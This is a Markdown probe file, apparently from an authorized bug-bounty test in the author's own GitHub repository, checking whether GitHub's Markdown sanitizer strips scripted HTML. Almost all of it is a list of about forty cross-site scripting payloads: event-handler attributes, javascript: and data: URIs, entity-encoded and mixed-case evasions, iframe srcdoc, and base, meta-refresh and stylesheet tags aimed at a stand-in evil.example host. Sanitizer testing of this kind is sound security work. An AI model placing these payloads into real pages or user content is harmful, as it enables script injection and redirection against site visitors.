# GFM sanitizer probe — g5 (own content, authorized)

Probe owner: Darkeydel (own public repo `gh-bounty-test-1`). One commit, no impact on anyone else.

## 1. classic img onerror
<img src=x onerror="alert(1)">

## 2. svg onload
<svg onload="alert(2)"></svg>

## 3. iframe
<iframe src="https://example.com"></iframe>

## 4. math
<math><mtext><mi>t</mi></mtext></math>

## 5. details ontoggle
<details open ontoggle="alert(3)"><summary>x</summary>y</details>

## 6. javascript href
<a href="javascript:alert(4)">js-href</a>

## 7. iframe srcdoc
<iframe srcdoc="<script>alert(5)</script>"></iframe>

## 8. object / embed
<object data="https://example.com"></object>
<embed src="https://example.com">

## 9. video poster onerror
<video poster=x onerror="alert(6)"><source></video>

## 10. form
<form action="javascript:alert(7)"><input></form>

## 11. style
<style>body{background:red}</style>

## 12. input autofocus onfocus
<input autofocus onfocus="alert(8)">

## 13. encoded / mixed-case / whitespace
<IMG SRC=x ONERROR="alert(9)">
<svg onload = "alert(10)">
<img src="x" o n e r r o r="alert(11)">
<img src="x" onerror=&#97;lert(12)>
<img src=x onerror="&#97;lert(13)">

## 14. data: URI
<img src="data:text/html,<script>alert(14)</script>">
<a href="data:text/html,<script>alert(15)</script>">data-href</a>

## 15. encoded javascript
<a href="&#106;avascript:alert(16)">encoded-js</a>
<a href="java&#x73;cript:alert(17)">hex-js</a>

## 16. markdown link with js URL
[link](javascript:alert(18))
[link](java%73cript:alert(19))

## 17. xmp / noembed / template / plaintext
<xmp><script>alert(20)</script></xmp>
<noembed><script>alert(21)</script></noembed>
<template><script>alert(22)</script></template>
<plaintext><script>alert(23)</script></plaintext>

## 18. autolink / protocol relative
<img src="//evil.example/x.png" onerror="alert(24)">

## 19. markdown image with js in alt
![x](x.png "title onerror=alert(25)")

## 20. katex / mathjax injection
$`onerror=alert(26)`$

## 21. custom attribute smuggling
<div data-x="&quot; onmouseover=&quot;alert(27)">y</div>

## 22. nested markdown in html
<div>
**bold** <img src=x onerror=alert(28)>
</div>

## 23. br with js via entity munging
<img src=x onerror=&#x61;lert(29)>

## 24. input type=image src
<input type="image" src="x" onerror="alert(30)">

## 25. marquee / blink
<marquee onstart="alert(31)">x</marquee>

## 26. table with background attr
<table background="javascript:alert(32)"><tr><td>x</td></tr></table>

## 27. base href
<base href="https://evil.example/">

## 28. link rel stylesheet
<link rel="stylesheet" href="data:text/css,body{background:url(https://evil.example/)}">

## 29. meta refresh
<meta http-equiv="refresh" content="0;url=https://evil.example/">

## 30. svg nested in markdown fence
```html
<img src=x onerror=alert(33)>
```

## 31. anchors with target and rel
<a target="_blank" href="https://example.com">newtab</a>

## 32. img srcset
<img srcset="x 1x, y 2x" onerror="alert(34)">

## 33. picture/source
<picture><source srcset="x" onerror="alert(35)"><img src=x onerror="alert(36)"></picture>

## 34. audio / track
<audio src=x onerror="alert(37)"></audio>

## 35. iframe with srcdoc entity-encoded
<iframe srcdoc="&lt;script&gt;alert(38)&lt;/script&gt;"></iframe>

## 36. division with xml namespace
<div xmlns="http://www.w3.org/1999/xhtml" onmouseover="alert(39)">x</div>

## 37. closed-style img with space in tag
< img src=x onerror=alert(40)>

## 38. backtick code block with html
`<script>alert(41)</script>`

## 39. reference link js
[ref][1]

[1]: javascript:alert(42)

## 40. heading with js id anchor
## <a id="x" href="javascript:alert(43)">head</a>
